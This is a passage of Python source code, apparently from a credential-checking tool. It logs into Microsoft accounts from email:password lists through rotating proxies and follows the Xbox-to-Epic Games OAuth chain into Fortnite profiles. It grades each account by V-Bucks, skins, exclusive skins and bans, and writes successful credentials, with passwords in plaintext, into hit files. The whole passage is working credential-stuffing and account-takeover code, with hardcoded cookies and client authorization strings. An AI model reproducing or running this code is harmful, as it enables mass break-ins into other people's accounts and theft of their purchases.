                                        url2 = f'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216&opid=F7304AA192830107&route={rr}'
                                        headers = {
                                            "Accept-Encoding": "gzip, deflate, br",
                                            "Accept-Language": "en,en-US;q=0.9,en;q=0.8",
                                            "Cache-Control": "max-age=0",
                                            "Connection": "keep-alive",
                                            "Content-Length": "267",
                                            "Content-Type": "application/x-www-form-urlencoded",
                                            "Cookie": f"MicrosoftApplicationsTelemetryDeviceId=920e613f-effa-4c29-8f33-9b639c3b321b; MSFPC=GUID=1760ade1dcf744b88cec3dccf0c07f0d&HASH=1760&LV=202311&V=4&LU=1701108908489; mkt=ar-SA; IgnoreCAW=1; MUID=251A1E31369E6D281AED0DE737986C36; MSCC=197.33.70.230-EG; MSPBack=0; NAP=V=1.9&E=1cca&C=sD-vxVi5jYeyeMkwVA7dKII2IAq8pRAa4DmVKHoqD1M-tyafuCSd4w&W=2; ANON=A=D086BC080C843D7172138ECBFFFFFFFF&E=1d24&W=2; SDIDC=CVbyEkUg8GuRPdWN!EPGwsoa25DdTij5DNeTOr4FqnHvLfbt1MrJg5xnnJzsh!HecLu5ZypjM!sZ5TtKN5sdEd2rZ9rugezwzlcUIDU5Szgq7yMLIVdfna8dg3sFCj!kQaXy2pwx6TFwJ7ar63EdVIz*Z3I3yVzEpbDMlVRweAFmG1M54fOyH0tdFaXs5Mk*7WyS05cUa*oiyMjqGmeFcnE7wutZ2INRl6ESPNMi8l98WUFK3*IKKZgUCfuaNm8lWfbBzoWBy9F3hgwe9*QM1yi41O*rE0U0!V4SpmrIPRSGT5yKcYSEDu7TJOO1XXctcPAq21yk*MnNVrYYfibqZvnzRMvTwoNBPBKzrM6*EKQd6RKQyJrKVdEAnErMFjh*JKgS35YauzHTacSRH6ocroAYtB0eXehx5rdp2UyG5kTnd8UqA00JYvp4r1lKkX4Tv9yUb3tZ5vR7JTQLhoQpSblC4zSaT9R5AgxKW3coeXxqkz0Lbpz!7l9qEjO*SdOm*5LBfF2NZSLeXlhol**kM3DFdLVyFogVq0gl0wR52Y02; MSPSoftVis=@:@; MSPRequ=id=N&lt=1701944501&co=0; uaid=a7afddfca5ea44a8a2ee1bba76040b3c; ai_session=6FvJma4ss/5jbM3ZARR4JM|1701943445431|1701944504493; wlidperf=FR=L&ST=1701944522902; __Host-MSAAUTH={msa}; PPLState=1; MSPOK=$uuid-d9559e5d-eb3c-4862-aefb-702fdaaf8c62$uuid-d48f3872-ff6f-457e-acde-969d16a38c95$uuid-c227e203-c0b0-411f-9e65-01165bcbc281$uuid-98f882b7-0037-4de4-8f58-c8db795010f1$uuid-0454a175-8868-4a70-9822-8e509836a4ef$uuid-ce4db8a3-c655-4677-a457-c0b7ff81a02f$uuid-160e65e0-7703-4950-9154-67fd0829b36a$uuid-dd8bae77-7811-4d1e-82dc-011f340afefe; OParams={o_params}",
                                            "Host": "login.live.com",
                                            "Origin": "https://login.live.com",
                                            "Referer": "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216",
                                            "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"",
                                            "sec-ch-ua-mobile": "?0",
                                            "sec-ch-ua-platform": "\"Windows\"",
                                            "Sec-Fetch-Dest": "document",
                                            "Sec-Fetch-Mode": "navigate",
                                            "Sec-Fetch-Site": "same-origin",
                                            "Sec-Fetch-User": "?1",
                                            "Upgrade-Insecure-Requests": "1",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
                                        }
                                        retr = 0
                                        while True:
                                            try:
                                                response = session.post(url2, headers=headers, data=payload, proxies=self.proxies(), timeout=Checker.timeout)
                                                if 'id/oauth-authorized?code=' in response.url:
                                                    break
                                                else:
                                                    if retr >= Checker.retries:
                                                        Counter.mshit+=1
                                                        if 'n' == self.cuimode:
                                                            self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
                                                        if not os.path.exists(self.folder + '/Microsoft'):
                                                            os.makedirs(self.folder + '/Microsoft')
                                                        open(f'{self.folder}/Microsoft/Hits.txt', 'a',
                                                        encoding='u8').write(f'{line}\n')
                                                        return
                                                    else:
                                                        retr+=1
                                                        Counter.retries+=1
                                                        continue 
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue

                                        parsed_url = urllib.parse.urlparse(response.url)
                                        query_params = urllib.parse.parse_qs(parsed_url.query)
                                        code = query_params.get('code', [None])[0]
                                        url = "https://www.epicgames.com/id/api/reputation"
                                        headers = {
                                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
                                            "Accept-Encoding": "gzip, deflate, br, zstd",
                                            "Accept-Language": "en-GB,en;q=0.5",
                                            "Connection": "keep-alive",
                                            "DNT": "1",
                                            "Host": "www.epicgames.com",
                                            "Priority": "u=0, i",
                                            "Sec-Fetch-Dest": "document",
                                            "Sec-Fetch-Mode": "navigate",
                                            "Sec-Fetch-Site": "none",
                                            "Sec-Fetch-User": "?1",
                                            "Sec-GPC": "1",
                                            "Upgrade-Insecure-Requests": "1",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
                                        }
                                        while True:
                                            try:                    
                                                response = scraper.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                cookies = response.cookies.get_dict()
                                                cookies.get('EPIC_SESSION_REPUTATION')
                                                cookies.get('EPIC_SESSION_AP')
                                                xsrf_token_cookie = cookies.get('XSRF-TOKEN')
                                                break
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue
                                        url = "https://www.epicgames.com/id/api/external/xbl/login"
                                        payload = {
                                            "code": f'{code}'
                                        }
                                        headers = {
                                            "POST": "/id/api/external/xbl/login HTTP/1.1",
                                            "Host": "www.epicgames.com",
                                            "Connection": "keep-alive",
                                            "X-Epic-Event-Category": "null",
                                            "X-XSRF-TOKEN": xsrf_token_cookie,
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 OPR/74.0.3911.107 (Edition utorrent)",
                                            "X-Epic-Event-Action": "null",
                                            "Content-Type": "application/json;charset=UTF-8",
                                            "Accept": "application/json, text/plain, */*",
                                            "X-Requested-With": "XMLHttpRequest",
                                            "X-Epic-Strategy-Flags": "guardianEmailVerifyEnabled=false;guardianKwsFlowEnabled=false;minorPreRegisterEnabled=false",
                                            "Origin": "https://www.epicgames.com",
                                            "Sec-Fetch-Site": "same-origin",
                                            "Sec-Fetch-Mode": "cors",
                                            "Sec-Fetch-Dest": "empty",
                                            "Referer": "https://www.epicgames.com/id/login/xbl?prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiJmN2MxODNkMzczYmQ0NzMxYTMxYjVjN2NlMGViNzE1ZSIsImlzV2ViIjp0cnVlLCJpcCI6IjE5Ny4yNi4xMzguMjE2IiwiaWQiOiIwMjEwYTIyNTcyMjU0ZDYzOTg1ZGFjOGU4NmM4MGVlZSIsImNvZGUiOiJNLlIzX0JBWS5mYzRjZGZjNi1iMTQ5LTNhN2YtYzZmNC1jZWMzY2Y3MDZmMDkifQ%253D%253D",
                                            "Accept-Language": "en-US,us;q=0.9",
                                            "Accept-Encoding": "gzip, deflate",
                                            "Content-Length": "56"  
                                        }
                                        while True:
                                            try:
                                                response = scraper.post(url, json=payload, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                if 'message":"Two-Factor authentication' in response.text or 'Please update your account with display name and email specified.' in response.text:
                                                    Counter.mshit+=1
                                                    Counter.epic2fa+=1
                                                    if 'n' == self.cuimode:
                                                        self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
                                                    if not os.path.exists(self.folder + '/Microsoft'):
                                                        os.makedirs(self.folder + '/Microsoft')
                                                    open(f'{self.folder}/Microsoft/2fa.txt', 'a',
                                                    encoding='u8').write(f'{line}\n')
                                                    return
                                                elif 'DATE_OF_BIRTH' in response.text or 'message":"No account was found to log you in' in response.text:
                                                    Counter.mshit+=1
                                                    Counter.xb +=1
                                                    if 'n' == self.cuimode:
                                                        self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
                                                    if not os.path.exists(self.folder + '/Microsoft'):
                                                        os.makedirs(self.folder + '/Microsoft')
                                                    open(f'{self.folder}/Microsoft/Xbox.txt', 'a',
                                                    encoding='u8').write(f'{line}\n')
                                                    return                                      
                                                elif 'code is required' in response.text:
                                                    Counter.retries+=1
                                                    continue
                                                else:
                                                    break
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue
                                        url = "https://www.epicgames.com/id/api/csrf"
                                        headers = {
                                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
                                            "Accept-Encoding": "gzip, deflate, br, zstd",
                                            "Accept-Language": "en-GB,en;q=0.5",
                                            "Connection": "keep-alive",
                                            "DNT": "1",
                                            "Host": "www.epicgames.com",
                                            "Priority": "u=0, i",
                                            "Sec-Fetch-Dest": "document",
                                            "Sec-Fetch-Mode": "navigate",
                                            "Sec-Fetch-Site": "none",
                                            "Sec-Fetch-User": "?1",
                                            "Sec-GPC": "1",
                                            "Upgrade-Insecure-Requests": "1",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
                                        }
                                        while True:
                                            try:
                                                response = scraper.get(url, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                break
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue
                                        url = "https://www.epicgames.com/id/api/redirect?redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&provider=xbl&clientId=875a3b57d3a640a6b7f9b4e883463ab4"
                                        headers = {
                                            "Accept": "application/json, text/plain, */*",
                                            "Accept-Encoding": "gzip, deflate, br, zstd",
                                            "Accept-Language": "en-US",
                                            "Cache-Control": "no-cache",
                                            "Pragma": "no-cache",
                                            "Priority": "u=1, i",
                                            "Referer": "https://www.epicgames.com/id/login/xbl?lang=en-US&redirect_uri=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&client_id=875a3b57d3a640a6b7f9b4e883463ab4&prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiIxZjg2NDVjMDNkNDk0NWVlOTBiYTU5MTE1OTQyNTI5MCIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9zdG9yZS5lcGljZ2FtZXMuY29tL2VuLVVTLyIsImlzV2ViIjp0cnVlLCJpcCI6IjExNS4xODcuNTguMTY0Iiwib3JpZ2luIjoiZXBpY2dhbWVzIiwiaWQiOiI4ZDVjNWVjMWVkZTI0ZjNmYWQzODRkMWU4Y2QxNWVmNiIsImNvZGUiOiJNLkM1NDVfQkwyLjIuVS40NGFhNmNlNi1lZWJlLTJjMzUtYTgyNi05YWIxZGE1NWYzNDAifQ%253D%253D",
                                            "Sec-Ch-Ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
                                            "Sec-Ch-Ua-Mobile": "?0",
                                            "Sec-Ch-Ua-Platform": "\"Windows\"",
                                            "Sec-Fetch-Dest": "empty",
                                            "Sec-Fetch-Mode": "cors",
                                            "Sec-Fetch-Site": "same-origin",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
                                            "X-Epic-Access-Key": "undefined",
                                            "X-Epic-Client-Id": "875a3b57d3a640a6b7f9b4e883463ab4",
                                            "X-Epic-Display-Mode": "web",
                                            "X-Epic-Duration": "2173",
                                            "X-Epic-Event-Action": "external",
                                            "X-Epic-Event-Category": "login",
                                            "X-Epic-Flow": "login",
                                            "X-Epic-Idp-Provider": "xbl",
                                            "X-Epic-Platform": "WEB",
                                            "X-Epic-Strategy-Flags": "isolatedTestFlagEnabled=false",
                                            "X-Requested-With": "XMLHttpRequest",
                                            "X-Xsrf-Token": xsrf_token_cookie
                                        }
                                        ret = 0
                                        while True:
                                            try:
                                                response = scraper.get(url, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                if '"sid":null,' in response.text or 'Please fill your real email' in response.text:
                                                    if ret >= Checker.retries:
                                                        Counter.mshit+=1
                                                        if 'n' == self.cuimode:
                                                            self.prints(f'{Fore.GREEN}[MS-HIT] - {line}')
                                                        if not os.path.exists(self.folder + '/Microsoft'):
                                                            os.makedirs(self.folder + '/Microsoft')
                                                        open(f'{self.folder}/Microsoft/Hits.txt', 'a',
                                                        encoding='u8').write(f'{line}\n')
                                                        return
                                                    else:
                                                        ret+=1
                                                        continue  
                                                sid = response.json()
                                                sid = sid.get("sid")
                                                if sid:
                                                    break
                                                else:
                                                    Counter.retries+=1
                                                    continue
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue
                                        url = f"https://www.epicgames.com/id/api/sso?sid={sid}"
                                        headers = {
                                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                                "Accept-Encoding": "gzip, deflate, br, zstd",
                                                "Accept-Language": "en-US,en;q=0.9",
                                                "Cache-Control": "no-cache",
                                                "Pragma": "no-cache",
                                                "Priority": "u=0, i",
                                                "Referer": "https://www.epicgames.com/id/login/xbl?lang=en-US&redirect_uri=https%3A%2F%2Fstore.epicgames.com%2Fen-US%2F&client_id=875a3b57d3a640a6b7f9b4e883463ab4&prompt=&extLoginState=eyJ0cmFja2luZ1V1aWQiOiIxZjg2NDVjMDNkNDk0NWVlOTBiYTU5MTE1OTQyNTI5MCIsInJlZGlyZWN0VXJsIjoiaHR0cHM6Ly9zdG9yZS5lcGljZ2FtZXMuY29tL2VuLVVTLyIsImlzV2ViIjp0cnVlLCJpcCI6IjExNS4xODcuNTguMTY0Iiwib3JpZ2luIjoiZXBpY2dhbWVzIiwiaWQiOiI4ZDVjNWVjMWVkZTI0ZjNmYWQzODRkMWU4Y2QxNWVmNiIsImNvZGUiOiJNLkM1NDVfQkwyLjIuVS40NGFhNmNlNi1lZWJlLTJjMzUtYTgyNi05YWIxZGE1NWYzNDAifQ%253D%253D",
                                                "Sec-Ch-Ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
                                                "Sec-Ch-Ua-Mobile": "?0",
                                                "Sec-Ch-Ua-Platform": "\"Windows\"",
                                                "Sec-Fetch-Dest": "document",
                                                "Sec-Fetch-Mode": "navigate",
                                                "Sec-Fetch-Site": "same-origin",
                                                "Upgrade-Insecure-Requests": "1",
                                                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
                                        }
                                        while True:
                                            response = self.process_redirect_chain(scraper, url, headers, response.cookies)
                                            if response:
                                                break
                                        display_name, country, accid, email_verified_status = self.parse_1(response.text)
                                        url = "https://www.epicgames.com/id/api/redirect?"
                                        headers = {
                                            "Host": "www.epicgames.com",
                                            "Connection": "keep-alive",
                                            "Accept": "application/json, text/plain, */*",
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/16.7.0-34134031+++Portal+Release-Live UnrealEngine/4.27.0-34134031+++Portal+Release-Live Chrome/90.0.4430.212 Safari/537.36",
                                            "X-Epic-Access-Key": "undefined",
                                            "X-Epic-Client-ID": "undefined",
                                            "X-Epic-Display-Mode": "web",
                                            "X-Epic-Duration": "375170",
                                            "X-Epic-Event-Action": "reminder",
                                            "X-Epic-Event-Category": "login",
                                            "X-Epic-Flow": "login",
                                            "X-Epic-Platform": "WEB",
                                            "X-Epic-Strategy-Flags": "isolatedTestFlagEnabled=false",
                                            "X-Requested-With": "XMLHttpRequest",
                                            "X-XSRF-TOKEN": xsrf_token_cookie,
                                            "sec-ch-ua": "\"Chromium\";v=\"90\"",
                                            "sec-ch-ua-mobile": "?0",
                                            "Sec-Fetch-Site": "same-origin",
                                            "Sec-Fetch-Mode": "cors",
                                            "Sec-Fetch-Dest": "empty",
                                            "Referer": "https://www.epicgames.com/id/login",
                                            "Accept-Language": "en",
                                            "Accept-Encoding": "gzip, deflate"
                                        }
                                        while True:
                                            try:
                                                response = scraper.get(url, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                ex_match = re.search(r'"exchangeCode":"(.*?)"', response.text)
                                                if ex_match:
                                                    ex = ex_match.group(1)
                                                    break
                                                else:
                                                    Counter.retries+=1
                                                    continue
                                            except Exception as e:
                                                    Counter.retries+=1
                                                    continue
                                        url = "https://account-public-service-prod.ak.epicgames.com/account/api/oauth/token"
                                        payload = {
                                            "grant_type": "exchange_code",
                                            "exchange_code": ex,
                                            "token_type": "eg1"
                                        }
                                        headers = {
                                            "Host": "account-public-service-prod.ak.epicgames.com",
                                            "Accept": "*/*",
                                            "X-Epic-Correlation-ID": "UE4-0cb999094c593037703e67a2364dad7a-63523E0D4DA6FA14E96DC9A5AC137A03-3E1FA7274351413FF9E430829D1920FC",
                                            "User-Agent": "UELauncher/16.7.0-34134031+++Portal+Release-Live Windows/10.0.19045.1.256.64bit",
                                            "Content-Type": "application/x-www-form-urlencoded",
                                            "Authorization": "basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y=",  # Replace this with the actual encoded credentials if necessary
                                            "Accept-Encoding": "gzip, deflate"
                                        }
                                        while True:
                                            try:
                                                response = scraper.post(url, data=payload, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                parsed_json = response.json()
                                                AT1 = parsed_json.get("access_token")
                                                ACCID = parsed_json.get("account_id")
                                                break
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue  
                                        headers = {
                                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                                            "Pragma": "no-cache",
                                            "Accept": "*/*",
                                            "Authorization": f"bearer {AT1}"
                                        }       
                                        url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
                                        while True:
                                            try:
                                                response = scraper.get(url, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                if '"code":"' in response.text:
                                                    start = response.text.find("\"code\":\"") + len("\"code\":\"")
                                                    end = response.text.find("\"", start)
                                                    CODE22 = response.text[start:end]
                                                    break
                                                else:
                                                    Counter.retries+=1
                                                    continue 
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue  
                                        headers = {
                                            "Content-Type": "application/x-www-form-urlencoded",
                                            "Authorization": "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
                                        }
                                        payload = {
                                            "grant_type": "exchange_code",
                                            "exchange_code": CODE22
                                        }
                                        url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token"
                                        while True:
                                            try:
                                                response = scraper.post(url, headers=headers, data=payload, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                if "refresh_token" in response.json():
                                                    RT = response.json().get("refresh_token")  
                                                    break
                                                else:
                                                    Counter.retries+=1
                                                    continue 
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue 
                                        headers = {
                                            "Content-Type": "application/x-www-form-urlencoded",
                                            "Authorization": "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
                                        }
                                        payload = {
                                            "grant_type": "refresh_token",
                                            "refresh_token": RT
                                        }
                                        while True:
                                            try:
                                                response = scraper.post(url, headers=headers, data=payload, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                if "access_token" in response.json():
                                                    AT = response.json().get("access_token")
                                                    break
                                                else:
                                                    Counter.retries+=1
                                                    continue 
                                            except Exception as e:
                                                Counter.retries+=1
                                                continue 
                                        headers = {
                                            "User-Agent": "UELauncher/11.0.2-14967703+++Portal+Release-Live Windows/10.0.19041.1.256.64bit",
                                            "Authorization": f"bearer {AT1}"
                                        }
                                        try:
                                            url = f"https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/{ACCID}"
                                            while True:
                                                try:
                                                    response = requests.get(url, headers=headers, proxies=self.proxies(), timeout=Checker.timeout)
                                                    if response.status_code == 200:
                                                        data = response.json()  
                                                        break
                                                    else:
                                                        Counter.retries+=1
                                                        continue 
                                                except Exception as e:
                                                    Counter.retries+=1
                                                    continue  
                                            display_name = data.get("displayName", "Not Available")
                                            country = data.get("country", "Not Available")
                                            tfa_enabled = data.get("tfaEnabled", "Not Available")
                                            epicEmail = data.get("email", "Not Available")
                                            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/public/QueryPublicProfile?profileId=campaign"
                                            headers = {
                                                "Authorization": f"Bearer {AT}",
                                                "Content-Type": "application/json"
                                            }
                                            while True:
                                                try:
                                                    response = scraper.post(url, headers=headers, json={}, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                    data = response.json()  
                                                    break
                                                except Exception as e:
                                                    Counter.retries+=1
                                                    continue  
                                            try:
                                                if "tutorial" in str(data):
                                                    has_stw = "YES"
                                                else:
                                                    has_stw = "NO"
                                            except:
                                                has_stw = 'ERROR'
                                            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/client/QueryProfile?profileId=athena&rvn=-1"
                                            headers = {
                                                "User-Agent": "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit",
                                                "Authorization": f"Bearer {AT}",
                                                "Content-Type": "application/json"
                                            }
                                            while True:
                                                try:
                                                    response = scraper.post(url, headers=headers, json={}, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                    response_str = response.text
                                                    break
                                                except Exception as e:
                                                    Counter.retries+=1
                                                    continue  
                                            if "Login is banned or does not posses the action 'PLAY'" in response_str or "numericErrorCode\" : 1023," in response_str or "messageVars\" : [ \"PLAY" in response_str or response.status_code == 403:
                                                Counter.mshit +=1
                                                Counter.fnban+=1
                                                if 'n' == self.cuimode:
                                                    self.prints(f'{Fore.YELLOW}[FN-BAN]] - {line}')
                                                if not os.path.exists(self.folder + '/Microsoft'):
                                                    os.makedirs(self.folder + '/Microsoft')
                                                open(f'{self.folder}/Microsoft/Banned.txt', 'a',
                                                encoding='u8').write(f'{line}\n')
                                                return
                                            Counter.hits+=1
                                            level_pattern = re.compile(r'"accountLevel"\s*:\s*(\d+)')
                                            total_wins_pattern = re.compile(r'"lifetime_wins"\s*:\s*(\d+)')
                                            level_match = level_pattern.search(response_str)
                                            level = level_match.group(1) if level_match else 'N/A'
                                            total_wins_match = total_wins_pattern.search(response_str)
                                            total_wins = total_wins_match.group(1) if total_wins_match else 'N/A'
                                            data = response.json()
                                            past_seasons = data.get('profileChanges', [])[0].get('profile', {}).get('stats', {}).get('attributes', {}).get('past_seasons', [])
                                            first_active_season = None
                                            for season in past_seasons:
                                                try:
                                                    if season['numWins'] > 0:
                                                        if first_active_season is None or season['seasonNumber'] < first_active_season['seasonNumber']:
                                                            first_active_season = season
                                                except:
                                                    continue
                                            if first_active_season:
                                                first_active_season = first_active_season['seasonNumber']
                                            else:
                                                first_active_season = 'N/A'
                                            skins = []
                                            exclusive = False
                                            exclusiveSkin = []
                                            localSkins = []
                                            try:
                                                with open('skins_database.txt', 'r') as file:
                                                    localSkins = file.readlines()
                                            except:
                                                localSkins = []
                                            def search_skins(obj):
                                                if isinstance(obj, dict):
                                                    for key, value in obj.items():
                                                        if key == "templateId" and value.startswith("AthenaCharacter:"):
                                                            found = False
                                                            skin_id = value.split("AthenaCharacter:")[1]
                                                            for linee in localSkins:
                                                                if linee.split(':')[0] == skin_id:
                                                                    found = True
                                                                    skinName = linee.split(':')[1]
                                                            if not found:
                                                                while True:
                                                                    try:
                                                                        url = f'https://fn-db.com/outfit/{skin_id}'
                                                                        skin_name = requests.get(url, proxies=self.proxies())
                                                                        if '<h1 class="font-weight-bold">' in skin_name.text:
                                                                            soup = BeautifulSoup(skin_name.text, 'html.parser')
                                                                            japanese_text = soup.h1.get_text()
                                                                            skinName = GoogleTranslator(source='ja', target='en').translate(japanese_text)
                                                                            with open('skins_database.txt', 'a') as file:
                                                                                file.write(f'{skin_id}:{skinName.lower()}' + '\n')
                                                                            break
                                                                        else:
                                                                            skinName = skin_id
                                                                            break
                                                                    except Exception as e:
                                                                        continue
                                                            skins.append(skinName)
                                                        else:
                                                            search_skins(value)
                                                elif isinstance(obj, list):
                                                    for item in obj:
                                                        search_skins(item)
                                            search_skins(data)
                                            unique_skins = set(skins)
                                            total_skins = len(unique_skins)
                                            processed_skins = [skin.replace("character_speeddial", "").strip() for skin in unique_skins]
                                            exclusiveSkins = [
                                                                'black knight','chun-li', 'huntmaster saber', 'the reaper', 'blue squire', 
                                                                'royale knight', 'sparkle specialist', 'gold brutus', 'omega', 
                                                                'gold midas', 'world cup', 'rogue agent', 'elite agent', 'trailblazer', 
                                                                'strong guard', 'rose team leader', 'warpaint', 'travis', 
                                                                'eddie brock', 'master chief'
                                                            ]
                                            for skin in processed_skins:
                                                if skin.lower() in exclusiveSkins:
                                                   exclusive = True
                                                   exclusiveSkin.append(skin)
                                            dances = []
                                            gliders = []
                                            pickaxes = []
                                            backpacks = []
                                            def search_items(obj):
                                                if isinstance(obj, dict):
                                                    for key, value in obj.items():
                                                        if key == "templateId":
                                                            if value.startswith("AthenaDance:eid_"):
                                                                dances.append(value)
                                                            elif value.startswith("AthenaGlider:"):
                                                                gliders.append(value)
                                                            elif value.startswith("AthenaPickaxe:"):
                                                                pickaxes.append(value)
                                                            elif value.startswith("AthenaBackpack:"):
                                                                backpacks.append(value)
                                                        else:
                                                            search_items(value)
                                                elif isinstance(obj, list):
                                                    for item in obj:
                                                        search_items(item)
                                            search_items(data)
                                            total_dances = len(dances)
                                            total_gliders = len(gliders)
                                            total_pickaxes = len(pickaxes)
                                            total_backpacks_bid = sum(1 for item in backpacks if "bid_" in item)
                                            total_backpacks_backpack = sum(1 for item in backpacks if "backpack_" in item)
                                            total_backpacks = total_backpacks_bid + total_backpacks_backpack
                                            url = f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{ACCID}/client/QueryProfile?profileId=common_core&rvn=-1"
                                            headers = {
                                                "User-Agent": "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit",
                                                "Authorization": f"bearer {AT}",
                                                "Content-Type": "application/json"
                                            }
                                            content = "{}"
                                            while True:
                                                try:
                                                    response = scraper.post(url, headers=headers, data=content, cookies=response.cookies, timeout=Checker.timeout, proxies=self.proxies())
                                                    if response.status_code == 200:
                                                        data = response.json()
                                                        break
                                                    else:
                                                        Counter.retries+=1
                                                        continue
                                                except Exception as e:
                                                    Counter.retries+=1
                                                    continue
                                            try:
                                                def extract_quantity():
                                                    quantity = 0
                                                    items = data['profileChanges'][0]['profile']['items']
                                                    for item_id, item in items.items():
                                                        if 'Currency:Mtx' in item['templateId']:
                                                            quantity += item.get('quantity', 0)
                                                    return quantity
                                                Total_VBucks = extract_quantity()
                                            except:
                                                Total_VBucks = 'Error'
                                            if 'n' == self.cuimode:
                                                self.prints(
                                                f'{Fore.GREEN}[FN-HIT]' +
                                                ('[FA]' if epicEmail.lower() == email.lower() else '[NFA]') +
                                                (f'[V:{Total_VBucks}]' if Total_VBucks > 0 else '') +
                                                (f'[S:{total_skins}]' if int(total_skins) > 0 else '') +
                                                (f'[P:{total_pickaxes}]' if int(total_pickaxes) > 0 else '') +
                                                (f'[B:{total_backpacks}]' if int(total_backpacks) > 0 else '') +
                                                f' - {line}'
                                                )
                                            fullAccess = 'NFA'
                                            if epicEmail == email:
                                                fullAccess = 'FA'
                                            Counter.skins_data.append({"fullAccess": fullAccess, "total_skins": total_skins, "exclusive": exclusive})
                                            if not os.path.exists(self.folder + '/Fortnite'):
                                                os.makedirs(self.folder + '/Fortnite')
                                            open(f'{self.folder}/Fortnite/Raw.txt', 'a',
                                            encoding='u8').write(f'{line}\n')
                                            message = f"Email: {email}\nPassword: {password}\nName: {display_name}\nType: {fullAccess}"
                                            if tfa_enabled != None: message+=f"\n2FA: {tfa_enabled}"
                                            if fullAccess == 'NFA': message+=f"\nEpic Email: {epicEmail}"
                                            if country != None: message+=f"\nCountry: {country}"
                                            if has_stw != 'NO': message+=f"\nSave The World"
                                            if level != None: message+=f"\nLevel: {level}"
                                            if Total_VBucks != None: message+=f"\nVbucks: {Total_VBucks}"
                                            if total_wins != None: message+=f"\nTotal Wins: {total_wins}"
                                            if first_active_season != None: message+=f"\nFirst Season: {first_active_season}"                                        
                                            if total_dances != None: message+=f"\nEmotes: {total_dances}"
